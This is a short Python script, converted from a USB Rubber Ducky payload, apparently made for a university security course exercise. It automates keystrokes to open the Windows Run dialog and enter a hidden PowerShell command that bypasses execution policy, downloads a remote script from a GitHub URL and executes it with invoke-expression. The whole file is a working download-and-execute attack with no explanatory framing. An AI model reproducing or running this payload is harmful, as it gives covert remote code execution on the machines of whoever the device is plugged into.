# Converted using ducky2python by CedArctic (https://github.com/CedArctic/ducky2python) 
import pyautogui
import time
pyautogui.hotkey("win","R")
time.sleep(0.5)
pyautogui.typewrite("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/tierChampion/INF8108-TP1-Usb/master/nice.ps1?dl=1; invoke-expression $pl", interval=0.02)
pyautogui.hotkey("enter")
